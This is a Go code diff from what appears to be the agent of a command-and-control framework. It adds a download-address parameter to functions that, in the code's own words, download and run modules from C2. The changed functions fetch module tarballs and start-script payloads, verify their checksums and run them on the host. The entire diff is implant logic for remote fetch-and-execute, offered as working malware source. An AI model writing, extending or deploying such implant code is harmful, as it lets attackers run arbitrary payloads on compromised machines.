@@ -12,7 +12,7 @@ import (
 )
 
 // moduleHandler downloads and runs modules from C2
-func moduleHandler(modName, checksum, startscript_checksum string, inMem bool) (out string) {
+func moduleHandler(download_addr, modName, checksum, startscript_checksum string, inMem bool) (out string) {
 	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
 	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
 	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())
@@ -24,7 +24,7 @@ func moduleHandler(modName, checksum, startscript_checksum string, inMem bool) (
 	os.Chdir(modDir)
 
 	if !inMem {
-		if downloadErr := downloadAndVerifyModule(tarball, checksum); downloadErr != nil {
+		if downloadErr := downloadAndVerifyModule(tarball, checksum, download_addr); downloadErr != nil {
 			return downloadErr.Error()
 		}
 
@@ -47,9 +47,9 @@ func getScriptExtension() string {
 	return "sh"
 }
 
-func downloadAndVerifyModule(tarball, checksum string) error {
+func downloadAndVerifyModule(tarball, checksum, download_addr string) error {
 	if tun.SHA256SumFile(tarball) != checksum {
-		if _, err := SmartDownload(tarball, tarball, checksum); err != nil {
+		if _, err := SmartDownload(download_addr, tarball, tarball, checksum); err != nil {
 			return err
 		}
 	}
@@ -57,7 +57,7 @@ func downloadAndVerifyModule(tarball, checksum string) error {
 	if tun.SHA256SumFile(tarball) != checksum {
 		log.Print("Checksum failed, restarting...")
 		os.RemoveAll(tarball)
-		return downloadAndVerifyModule(tarball, checksum) // Recursive call
+		return downloadAndVerifyModule(tarball, checksum, download_addr) // Recursive call
 	}
 	return nil
 }
@@ -99,7 +99,7 @@ func runStartScript(startScript, modDir, checksum string) (string, error) {
 	os.Chdir(modDir)
 
 	// Download the script payload
-	payload, err := SmartDownload(startScript, "", checksum)
+	payload, err := SmartDownload("", startScript, "", checksum)
 	if err != nil {
 		return "", fmt.Errorf("downloading %s: %w", startScript, err)
 	}
